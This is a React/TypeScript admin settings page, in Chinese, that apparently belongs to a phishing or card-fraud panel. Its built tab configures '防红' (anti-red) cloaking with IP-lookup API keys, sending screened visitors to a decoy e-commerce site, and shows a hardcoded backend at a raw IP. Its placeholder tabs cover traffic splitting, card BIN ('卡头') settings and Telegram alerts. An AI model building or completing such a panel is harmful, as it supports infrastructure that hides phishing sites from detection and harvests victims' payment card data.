"use client"

import { useState } from "react"
import Layout from "@/components/layout"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import {
  Link,
  Settings,
  Bell,
  UploadCloud,
  Copy,
  Info,
  ShieldCheck,
  RefreshCw,
  Save,
  KeyRound,
  Share2,
  CreditCard,
  Send,
  AlertTriangle,
} from "lucide-react"
import { useToast } from "@/components/ui/use-toast"

export default function SystemSettingsPage() {
  const { toast } = useToast()
  const [apiKey, setApiKey] = useState("")
  const [redirectUrl, setRedirectUrl] = useState("")
  const [backendDomain, setBackendDomain] = useState("")
  const currentBackendUrl = "http://31.97.134.136/qnxbvd0l14/"

  const handleSaveAntiRedirection = () => {
    // Implement save logic here
    console.log("Saving Anti-Redirection Config:", { apiKey, redirectUrl })
    toast({
      title: "防红配置已保存",
      description: "API Key 和跳转地址已更新。",
    })
  }

  const handleResetAntiRedirection = () => {
    setApiKey("")
    setRedirectUrl("")
    toast({
      title: "防红配置已重置",
    })
  }

  const handleSaveBackendDomain = () => {
    // Implement save logic here
    console.log("Saving Backend Domain:", { backendDomain })
    toast({
      title: "后台域名已配置",
      description: `新的后台域名 ${backendDomain} 已设置。`,
    })
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    toast({
      title: "已复制",
      description: "地址已复制到剪贴板。",
    })
  }

  return (
    <Layout>
      <div className="space-y-6">
        <Tabs defaultValue="connections" className="w-full">
          <TabsList className="grid w-full grid-cols-3 sm:grid-cols-4 md:grid-cols-7 bg-slate-800/50 p-1 h-auto">
            <TabsTrigger
              value="connections"
              className="data-[state=active]:bg-purple-600 data-[state=active]:text-white text-slate-300"
            >
              <Link className="h-4 w-4 mr-2" />
              Connections
            </TabsTrigger>
            <TabsTrigger
              value="backend-settings"
              className="data-[state=active]:bg-purple-600 data-[state=active]:text-white text-slate-300"
            >
              <Settings className="h-4 w-4 mr-2" />
              后台设置
            </TabsTrigger>
            <TabsTrigger
              value="shunting-control"
              className="data-[state=active]:bg-purple-600 data-[state=active]:text-white text-slate-300"
            >
              <Share2 className="h-4 w-4 mr-2" />
              分流控制
            </TabsTrigger>
            <TabsTrigger
              value="card-header-settings"
              className="data-[state=active]:bg-purple-600 data-[state=active]:text-white text-slate-300"
            >
              <CreditCard className="h-4 w-4 mr-2" />
              卡头设置
            </TabsTrigger>
            <TabsTrigger
              value="telegram"
              className="data-[state=active]:bg-purple-600 data-[state=active]:text-white text-slate-300"
            >
              <Send className="h-4 w-4 mr-2" />
              Telegram
            </TabsTrigger>
            <TabsTrigger
              value="notifications"
              className="data-[state=active]:bg-purple-600 data-[state=active]:text-white text-slate-300"
            >
              <Bell className="h-4 w-4 mr-2" />
              通知
            </TabsTrigger>
            <TabsTrigger
              value="import-export"
              className="data-[state=active]:bg-purple-600 data-[state=active]:text-white text-slate-300"
            >
              <UploadCloud className="h-4 w-4 mr-2" />
              导入导出配置
            </TabsTrigger>
          </TabsList>

          <TabsContent value="connections" className="mt-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-slate-100 text-lg">防红配置</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label className="text-sm text-slate-400">
                      前往{" "}
                      <a
                        href="https://dashboard.ipregistry.co/signup"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-purple-400 hover:text-purple-300 underline"
                      >
                        <KeyRound className="inline h-4 w-4 mr-1" />
                        https://dashboard.ipregistry.co/signup
                      </a>{" "}
                      申请免费的 API 密钥 (
                      <Info className="inline h-3 w-3 mr-1" />
                      点我查看步骤)
                    </Label>
                  </div>
                  <div className="space-y-1">
                    <Label htmlFor="api-keys" className="text-slate-300">
                      API Keys (剩余积分: 1)
                    </Label>
                    <Input
                      id="api-keys"
                      value={apiKey}
                      onChange={(e) => setApiKey(e.target.value)}
                      placeholder="请输入 API Key"
                      className="bg-slate-800 border-slate-600 text-slate-100"
                    />
                  </div>
                  <div className="space-y-1">
                    <Label htmlFor="redirect-url" className="text-slate-300">
                      拦截后跳转地址 (例如: https://xxx.com)
                    </Label>
                    <Input
                      id="redirect-url"
                      value={redirectUrl}
                      onChange={(e) => setRedirectUrl(e.target.value)}
                      placeholder="默认为电商网站"
                      className="bg-slate-800 border-slate-600 text-slate-100"
                    />
                  </div>
                  <div className="flex space-x-2 pt-2">
                    <Button onClick={handleSaveAntiRedirection} className="bg-purple-600 hover:bg-purple-700">
                      <Save className="h-4 w-4 mr-2" />
                      保存
                    </Button>
                    <Button
                      variant="outline"
                      onClick={handleResetAntiRedirection}
                      className="bg-slate-700 border-slate-600 hover:bg-slate-600"
                    >
                      <RefreshCw className="h-4 w-4 mr-2" />
                      重置
                    </Button>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
                <CardHeader>
                  <CardTitle className="text-slate-100 text-lg">配置后台域名</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <p className="text-sm text-slate-400">
                    为您的后台添加一个域名吧，这样就可以通过域名访问您的后台了。
                    申请SSL证书前，确保域名已成功解析到后台IP。
                  </p>
                  <Alert variant="destructive" className="bg-red-500/10 border-red-500/30">
                    <AlertTriangle className="h-4 w-4 text-red-400" />
                    <AlertTitle className="text-red-300">注意</AlertTitle>
                    <AlertDescription className="text-red-400 text-sm">
                      前台域名作后台域名, 后台域名需要点击右边图标手动申请证书!
                    </AlertDescription>
                  </Alert>
                  <div className="space-y-1">
                    <Label htmlFor="backend-domain" className="text-slate-300">
                      添加后台域名
                    </Label>
                    <div className="flex items-center space-x-2">
                      <Input
                        id="backend-domain"
                        value={backendDomain}
                        onChange={(e) => setBackendDomain(e.target.value)}
                        placeholder="例如: admin.yourdomain.com"
                        className="bg-slate-800 border-slate-600 text-slate-100"
                      />
                      <Button
                        variant="outline"
                        size="icon"
                        className="bg-slate-700 border-slate-600 hover:bg-slate-600"
                        title="申请证书"
                      >
                        <ShieldCheck className="h-4 w-4 text-purple-400" />
                      </Button>
                    </div>
                  </div>
                  <div className="space-y-1">
                    <Label className="text-slate-300">当前后台地址:</Label>
                    <div className="flex items-center space-x-2">
                      <Input
                        value={currentBackendUrl}
                        readOnly
                        className="bg-slate-800 border-slate-600 text-slate-400"
                      />
                      <Button
                        variant="outline"
                        size="icon"
                        onClick={() => copyToClipboard(currentBackendUrl)}
                        className="bg-slate-700 border-slate-600 hover:bg-slate-600"
                        title="复制地址"
                      >
                        <Copy className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                  <div className="pt-2">
                    <Button onClick={handleSaveBackendDomain} className="bg-purple-600 hover:bg-purple-700">
                      <Save className="h-4 w-4 mr-2" />
                      保存域名
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Placeholder for other tabs */}
          <TabsContent value="backend-settings">
            <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-slate-100">后台设置</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-slate-400">后台设置内容将在此处显示。</p>
              </CardContent>
            </Card>
          </TabsContent>
          <TabsContent value="shunting-control">
            <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-slate-100">分流控制</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-slate-400">分流控制内容将在此处显示。</p>
              </CardContent>
            </Card>
          </TabsContent>
          <TabsContent value="card-header-settings">
            <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-slate-100">卡头设置</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-slate-400">卡头设置内容将在此处显示。</p>
              </CardContent>
            </Card>
          </TabsContent>
          <TabsContent value="telegram">
            <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-slate-100">Telegram</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-slate-400">Telegram 配置内容将在此处显示。</p>
              </CardContent>
            </Card>
          </TabsContent>
          <TabsContent value="notifications">
            <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-slate-100">通知</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-slate-400">通知设置内容将在此处显示。</p>
              </CardContent>
            </Card>
          </TabsContent>
          <TabsContent value="import-export">
            <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
              <CardHeader>
                <CardTitle className="text-slate-100">导入导出配置</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-slate-400">导入导出配置内容将在此处显示。</p>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </Layout>
  )
}
